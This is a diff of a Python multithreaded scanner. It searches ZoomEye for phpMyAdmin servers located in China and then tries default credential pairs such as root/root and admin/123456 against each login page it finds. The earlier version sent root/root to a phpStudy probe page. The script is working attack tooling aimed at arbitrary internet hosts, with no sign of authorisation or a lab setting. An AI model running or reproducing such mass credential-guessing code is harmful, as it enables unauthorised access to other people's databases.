@@ -35,7 +35,7 @@ class Crawl_thread(threading.Thread):
                 page = self.queue.get()
                 print('当前工作的线程为：', self.thread_id, " 正在采集：", page)
                 try:
-                    data = zm.dork_search('phpStudy探针 +country:"CN"', page)
+                    data = zm.dork_search('app:"PhpMyAdmin httpd" +country:"CN"', page)
                     for ip in zm.dork_filter("ip,port"):
                         data_queue.put(str(ip[0]) + ':' + str(ip[1]))  # 将采集的结果放入data_queue中
                 except Exception as e:
@@ -62,29 +62,31 @@ class Parser_thread(threading.Thread):
                 pass
 
     def parse_data(self, item):
-        '''
-                解析网页内容的函数
-                :param item:
-                :return:
-                '''
+        username_list = ['root', 'admin']
+        password_list = ['root', '', 'admin', '123456', 'password']
         # 发起 post 请求
-        url = 'http://' + item + '/l.php'
-        data = {
-            'host': 'localhost',
-            'port': '3306',
-            'login': 'root',
-            'password': 'root',
-            'act': 'MySQL检测',
-            'funName': ''
-        }
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': item,
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
-        }
-        res = requests.post(url=url,data=data,
-                            headers=headers)
-        print(res.text)
+        url = 'http://' + str(item) + '/index.php'
+        print(url)
+        for username in username_list:
+            username = username.rstrip()
+            for password in password_list:
+                password = password.rstrip()
+                try:
+                    data = {'pma_username': username, 'pma_password': str(password)}
+                    response = requests.post(url, data=data, timeout=5)
+                    result = response.content
+                    print(result.find('name="login_form"'))
+                
+                    # if result.find('name="login_form"') == -1:
+                    #     print('====================================================')
+                    #     print('[+] find phpMyAdmin weak password：' + username, password)
+                    #     print('====================================================')
+                    #     break
+                    # else:
+                    #     print('[-] Checking for ' + username, password + " fail")
+                except Exception as e:
+                    print(e)
+                    print('[-] Something Error ' + username, password + " fail ")
         print('退出了该线程：', self.thread_id)
 
 
